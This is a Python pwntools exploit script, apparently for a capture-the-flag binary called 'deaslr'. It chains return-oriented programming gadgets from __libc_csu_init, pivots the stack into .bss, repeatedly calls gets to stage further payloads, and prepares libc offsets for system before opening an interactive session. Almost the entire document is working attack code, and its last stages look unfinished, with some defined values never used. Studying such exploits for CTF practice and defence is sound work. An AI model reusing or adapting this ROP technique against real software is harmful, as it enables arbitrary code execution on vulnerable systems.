#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
context.log_level = 'debug'

elf = ELF('./deaslr')
libc = ELF('./libc_64.so.6')

# ROP Gadgets
__libc_csu_init = elf.symbols['__libc_csu_init']
gadget1 = __libc_csu_init + 64  # mov rdx, r13; mov rsi, r14 ; mov edi, r15d ; call qword ptr [r12+rbx*8]
gadget2 = __libc_csu_init + 90  # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
gadget3 = 0x4005c3  # pop rdi ; ret
gadget4 = 0x4005bd  # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
gadget5 = 0x4005bc  # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

# GOT stuff (Since PIE disabled, the GOT (in .data) is at a fixed location)
gets_got_plt = 0x600ff0

# libc
libc_system_offset = 0x45390
libc_gets_offset   = 0x6ed80

# Byte sequence alias
# usually only A8 is needed, but we can use different byte sequences to assist in debugging.
A8 = 8 * b'A'
B8 = 8 * b'B'
C8 = 8 * b'C'


def main():
    proc = elf.process()
    log.debug('You may attatch this process to gdb now.')
    raw_input()

    buf = elf.bss() + 0x100

    # migrate stack to .bss
    payload =  3 * A8                       # padding
    payload += p64(gadget3)                 # ret
    payload += p64(buf)                     # rdi
    payload += p64(elf.sym['gets'])         # ret
    payload += p64(gadget4)                 # ret
    payload += p64(buf)                     # rsp (new)
    proc.sendline(payload)

    # write to new stack (on .bss)
    payload =  3 * A8                       # padding
    payload += p64(elf.sym['main'])         # ret
    proc.sendline(payload)

    # we execute main() again, but this time our stack is on .bss
    # note that main() will execute gets() again.
    payload =  3 * B8                       # padding
    payload += p64(gadget3)                 # ret
    payload += p64(0x6010a8)                # rdi
    payload += p64(elf.sym['gets'])         # ret
    payload += p64(gadget3)                 # ret
    payload += p64(0x6010e0)                # rdi
    payload += p64(elf.sym['gets'])         # ret
    payload += p64(gadget4)                 # ret
    payload += p64(0x601090)                # rsp (new)
    proc.sendline(payload)
    proc.sendline(p64(gadget2) + b'RBX_VALU')
    proc.sendline(p64(gadget1))


    proc.interactive()



if __name__ == '__main__':
    main()
